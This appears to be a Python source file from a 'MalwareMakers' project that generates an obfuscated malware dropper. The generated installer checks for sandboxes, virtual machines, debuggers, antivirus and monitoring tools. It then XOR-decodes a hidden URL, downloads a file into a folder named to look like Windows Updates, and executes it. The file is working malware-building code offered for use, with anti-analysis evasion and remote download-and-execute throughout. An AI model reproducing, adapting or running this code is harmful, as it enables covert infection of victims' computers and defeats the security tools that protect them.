# Made by MalwareMakers 
# Github : https://github.com/MalwareMakers

import logging
from rich.logging import RichHandler
import time
from src.file_encoder import *

FORMAT = "%(message)s"

logging.basicConfig(
    level="NOTSET",format=FORMAT,datefmt="[%X]", handlers=[RichHandler()]
)

log = logging.getLogger('rich')

save_dir = r"C:\ProgamData\WindowsUpdates"

class Installer_Builder:
    def __init__(self,github_url,key):
        self.url = github_url
        self.key = key
        self.save_dir = save_dir
    
    def Installer_gen(self):
        log.info("Begining Creation of Installer payload")
        try:
            code = r'''

class Decode:
    def __init__(self,key,text):
        self.key = key
        self.text = text

    def _apply_xor(self,text):
        encrypted = ""
        key_index = 0
        for char in text:
            encrypted_char = chr(ord(char) ^ ord(self.key[key_index]))
            encrypted += encrypted_char
            key_index = (key_index + 1) % len(self.key)
        return encrypted

    def _to_hex(self,text):
        return "".join(format(ord(char), '02X') for char in text)

    def _from_hex(self,text):
        return bytes.fromhex(text).decode('utf-8')

    def decrypt(self):
        decrypted_hex = self._from_hex(self.text)
        return self._apply_xor(decrypted_hex)

class Dowload:
    def __init__(self,url,save_dir):
        self.url = url
        self.output_path = save_dir
    def download_and_execute_file(self):
        response = requests.get(self.url)

        if response.status_code == 200:
            parsed_url = urlparse(self.url)
            filename = parsed_url.path.split("/")[-1]

            # Combine the save_directory and filename to get the full path
            file_path = os.path.join(self.output_path, filename)

            # Ensure the save_directory exists; create it if not
            os.makedirs(self.output_path, exist_ok=True)

            with open(file_path, "wb") as f:
                f.write(response.content)
            print(f"File downloaded successfully and saved at: {file_path}")

            # Make the file executable (only necessary for executable files)
            os.chmod(file_path, 0o755)

            # Execute the downloaded file
            subprocess.run([file_path])
        else:
            pass

class Detection: 
    def __init__(self):
        pass

    def error(self): 
        try: 
            import key
        except ImportError as e:
            print(f"No module: {str(e)}")

    def check_os(self): 
        os_name = platform.system()
        if os_name != 'Windows':
            return "danger"
        return "safe"
    
    def pid_hunt(self):
        def check_process(process_name):
            for process in psutil.process_iter(attrs=['name']):
                if process.info['name'] == process_name:
                    return True
            return False

        processes_to_check = [
            {'pid': 1616, 'name': 'sysmon.exe'},
            {'pid': 2400, 'name': 'frida-winjector-helper-32.exe'},
            {'pid': 2464, 'name': 'frida-winjector-helper-64.exe'},
            {'pid': 1272, 'name': 'wspsvc.exe'},
            {'pid': 664, 'name': 'stigthymwmxu.exe'},
            {'pid': 2772, 'name': 'drjzmo.exe'},
            {'pid': 1904, 'name': 'avp.exe'},
            {'pid': 4000, 'name': 'avpui.exe'},
            {'pid': 4188, 'name': 'jhoslg.exe'},
            {'name': 'procmon.exe'},
            {'name': 'Vsserv.exe'},
            {'name': 'Postman.exe'},
            {'name': 'ollydbg.exe'},
            {'name': 'ProcessHacker.exe'},
            {'name': 'tcpview.exe'},
            {'name': 'regmon.exe'},
            {'name': 'procep.exe'},
            {'name': 'idaq.exe'},
            {'name': 'idaq64.exe'},
            {'name': 'ImmunityDebugger.exe'},
            {'name': 'Wireshark.exe'},
            {'name': 'dumpcap.exe'},
            {'name': 'HookExplorer.exe'},
            {'name': 'ImportREC.exe'},
            {'name': 'PETools.exe'},
            {'name': 'LordPE.exe'},
            {'name': 'SysInspector.exe'}, 
            {'name': 'proc_analyzer.exe'},
            {'name': 'sysAnalyzer.exe'},
            {'name': 'sniff_hit.exe'},
            {'name': 'windbg.exe'},
            {'name': 'joeboxcontrol.exe'},
            {'name': 'joeboxserver.exe'},
            {'name': 'ResourceHacker.exe'},
            {'name': 'x32dbg.exe'},
            {'name': 'x64dbg.exe'},
            {'name': 'Fiddler.exe'},
            {'name': 'httpdebugger.exe'},
            {'name': 'Sysmon64.exe'},
            {'name': 'nioswk.exe'},
            {'name': 'EDhVfFCHsBIIflrGw.exe'},
            {'name': 'lujazdkmiseqp.exe'},
            {'name': 'VmRemoteGuest.exe'},
            {'name': 'VirtualBoxVM.exe'},
            {'name': 'VBoxSVC.exe'},
        ]
        for process_info in processes_to_check:
            process_name = process_info['name']
            
            if check_process(process_name):
                return "danger"   
        return "safe"
    
    def Sandbox(self):
        EvidenceOfSandbox = []
        sandboxProcesses = "vmsrvc", "tcpview", "wireshark", "visual basic", "fiddler", "vmware", "vbox", "process explorer", "autoit", "vboxtray", "vmtools", "vmrawdsk", "vmusbmouse", "vmvss", "vmscsi", "vmxnet", "vmx_svga", "vmmemctl", "df5serv", "vboxservice", "vmhgfs"
        _, runningProcesses = win32pdh.EnumObjectItems(None,None,'process', win32pdh.PERF_DETAIL_WIZARD)
        for process in runningProcesses:
            for sandboxProcess in sandboxProcesses:
                if sandboxProcess in str(process):
                    if process not in EvidenceOfSandbox:
                        EvidenceOfSandbox.append(process)
                        break
        return EvidenceOfSandbox

'''

            code2 = r'''
def main(): 
    save_dir = "{}"
    key = "{}"
    text = "{}"

    d = Detection()
    
    os_v = d.check_os()
    if os_v.lower() != "safe": 
        d.error()
    else: 
        sandbox = d.Sandbox()
        if sandbox:
            d.error()
        else: 
            detect = d.pid_hunt()
            if detect.lower() != "safe": 
                d.error()
            else: 
                decode = Decode(key=key, text=text)
                url = decode.decrypt()
                get = Dowload(url=url, save_dir=save_dir)
                get.download_and_execute_file()

main()'''.format(self.save_dir,self.key,self.url)
            total = code + code2
            file_encoder = File_encoder(code=total, type1="installer")
            code = file_encoder.File_encoder()
            log.info("Payload Creation Complete!")
        except Exception as e:
            log.error(f"An error has occured: {str(e)}")
            print(str(e))
        time.sleep(2)
        log.info("Writing Payload to File")
        try: 
            name1 = 'installer.py'
            with open(name1, 'w') as f: 
                f.writelines(code)
            log.info("Completed creation of install file!")
        except Exception as e: 
            log.error(f"An error has occured: {str(e)}")
            print(str(e))
        
        return True, name1